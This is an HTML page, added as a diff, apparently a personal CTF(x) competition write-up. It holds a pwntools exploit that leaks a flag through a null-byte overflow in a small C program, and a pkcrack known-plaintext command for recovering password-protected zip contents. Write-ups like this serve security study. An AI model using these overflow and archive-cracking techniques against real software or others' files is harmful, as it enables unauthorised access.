@@ -1,0 +1,149 @@
+<html>
+ <head>
+<title>Ctf(x)</title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+h2{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Ctf(x) </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Ctf(x) Writeup  </h1>
+   
+ <br> 
+
+<h2> Guesslength [PWN] : Null-byte overflow !!!</h2>
+
+<p> This question taught me something new .. i.e There is no boundary stopping you from sucess :) <br>
+    In this question the buffer was first followed by a int and then flag and stack cannary was enabled i tried too overwrite the argv[0] but no luck the sol was to <br>
+    Overflow the null byte appended by scanf .. to int and then overwrite that null byte through next input by doing so we ensure that we extend the boundary of our buffer <br>
+    So '%s' reads our flag too .... </p>
+
+
+<code>// gcc -o guesslength -m32 guesslength.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+typedef struct {
+	char input[50]; // ebp-120
+	int length;     // ebp-68
+	char flag[50]; //  ebp-64 // ebp-63
+} data;
+
+int main()
+{			
+	setbuf(stdout, NULL);
+	data d;
+
+	strncpy(d.flag, "REDACTED", sizeof(d.flag));
+	
+	printf("Enter your text: ");
+	scanf("%s", d.input);
+	
+	printf("Guess the length of this text: ");
+	scanf("%d", &d.length);
+	
+	if (strlen(d.input) == d.length) {
+		printf("You guessed the length correctly. Great job!\n");
+	} else {
+		printf("The actual length of '%s' is %ld, not %d. Sorry :(\n", d.input, strlen(d.input), d.length);
+	}
+	
+	return 0;
+} </code>
+
+
+<br>
+<code>
+
+from pwn import *
+
+HOST,PORT = "problems.ctfx.io",1338
+r=remote(HOST,PORT)
+
+r.sendline("a" * 53)  # fill the text buffer, and make the null byte overflow into the int's memory
+
+r.sendline("2147483647")  # a large number will ensure that the null byte (which is in the int's memory) is overwritten
+
+print r.recv(4000)
+
+#ctf(hiding_behind_a_null_overwrite)
+</code>
+
+<br>
+
+<h2> Password [Forensic]</h2>
+
+<p> Ok we were given two Zip files and both are password protected .. so used fcrackzip dict bruteforce one was crackable .. and it contained two files .vcf and a signature <br>
+    the other zip too contained .vcf and a signature so all we have to do is predict the .vcf of 2nd file using 1st then do a <b>Plain-text attack</b> using pkcrack  </p>
+
+<code> ./pkcrack -C Ryan\ King.zip -c 'Ryan King.vcf' -P archive.zip -p 'Ryan King.vcf' -d decrypted.zip -a </code>
+
+</body>
+</html>
